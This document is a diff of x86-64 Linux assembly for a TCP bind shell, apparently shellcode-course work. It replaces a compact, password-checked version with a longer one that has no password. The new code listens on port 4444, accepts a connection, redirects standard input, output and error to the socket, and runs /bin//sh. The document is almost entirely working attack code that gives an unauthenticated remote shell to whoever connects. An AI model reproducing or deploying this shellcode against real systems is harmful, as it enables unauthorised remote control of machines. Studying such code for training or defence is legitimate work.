@@ -1,5 +1,6 @@
 global _start
 
+
 _start:
 
 	; sock = socket(AF_INET, SOCK_STREAM, 0)
@@ -7,108 +8,140 @@ _start:
 	; SOCK_STREAM = 1
 	; syscall number 41 
 
-	push 41
-	pop rax
-	push 2
-	pop rdi
-	push 1
-	pop rsi
-	cdq
-	syscall
+	xor rax,rax
+	mov al,41
 	
+	mov rax, 41
+	mov rdi, 2
+	mov rsi, 1
+	mov rdx, 0
+	syscall
+
 	; copy socket descriptor to rdi for future use 
 
 	mov rdi, rax
+
 
 	; server.sin_family = AF_INET 
 	; server.sin_port = htons(PORT)
 	; server.sin_addr.s_addr = INADDR_ANY
 	; bzero(&server.sin_zero, 8)
 
-	push rdx
-	mov dx,0x5c11
-	shl rdx,16
-	xor dl,0x2
-	push rdx
+	xor rax, rax 
+
+	push rax
+
+	mov dword [rsp-4], eax
+	mov word [rsp-6], 0x5c11
+	mov word [rsp-8], 0x2
+	sub rsp, 8
+
 
 	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
 	; syscall number 49
 
+	mov rax, 49
+	
 	mov rsi, rsp
-	push 49
-	pop rax
-	push 16
-	pop rdx
+	mov rdx, 16
 	syscall
+
 
 	; listen(sock, MAX_CLIENTS)
 	; syscall number 50
 
-	push 50
-	pop rax
-	push 2
-	pop rsi
+	mov rax, 50
+	mov rsi, 2
 	syscall
+
 
 	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
 	; syscall number 43
 
-	push 43
-	pop rax
+	
+	mov rax, 43
 	sub rsp, 16
 	mov rsi, rsp
-	push 16
-	mov rdx, rsp
-	syscall
+        mov byte [rsp-1], 16
+        sub rsp, 1
+        mov rdx, rsp
 
-	; close parent
-	;push 3
-	;pop rax
-	;syscall
+        syscall
 
-	; duplicate sockets
+	; store the client socket description 
+	mov r9, rax 
 
-	; dup2 (new, old)
-	mov rdi, rax
-	push 3
-	pop rsi
-dup2cycle:
-	mov al, 33
-	dec esi
-	syscall
-	loopnz dup2cycle
+        ; close parent
 
-	; read passcode
-	; xor rax,rax - already zeroed from prev cycle
-	xor rdi,rdi
-	push rax
-	mov rsi,rsp
-	push 8
-	pop rdx
-	syscall
+        mov rax, 3
+        syscall
 
-	; Authentication with password "1234567"
-	mov rcx,rax
-	mov rbx,0x0a37363534333231
-	push rbx
-	mov rdi,rsp
-	repe cmpsb
-	jnz wrong_pwd
+        ; duplicate sockets
 
-	; execve stack-method
+        ; dup2 (new, old)
+        mov rdi, r9
+        mov rax, 33
+        mov rsi, 0
+        syscall
 
-	push 59
-	pop rax
-	cdq ; extends rax sign into rdx, zeroing it out
-	push rdx
-	mov rbx, 0x68732f6e69622f2f
-	push rbx
-	mov rdi, rsp
-	push rdx
-	mov rdx, rsp
-	push rdi
-	mov rsi, rsp
-	syscall
+        mov rax, 33
+        mov rsi, 1
+        syscall
 
-wrong_pwd:
-	nop
+        mov rax, 33
+        mov rsi, 2
+        syscall
+
+
+
+        ; execve
+
+        ; First NULL push
+
+        xor rax, rax
+        push rax
+
+        ; push /bin//sh in reverse
+
+        mov rbx, 0x68732f2f6e69622f
+        push rbx
+
+        ; store /bin//sh address in RDI
+
+        mov rdi, rsp
+
+        ; Second NULL push
+        push rax
+
+        ; set RDX
+        mov rdx, rsp
+
+
+        ; Push address of /bin//sh
+        push rdi
+
+        ; set RSI
+
+        mov rsi, rsp
+
+        ; Call the Execve syscall
+        add rax, 59
+        syscall
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+	
+	
+
+ 
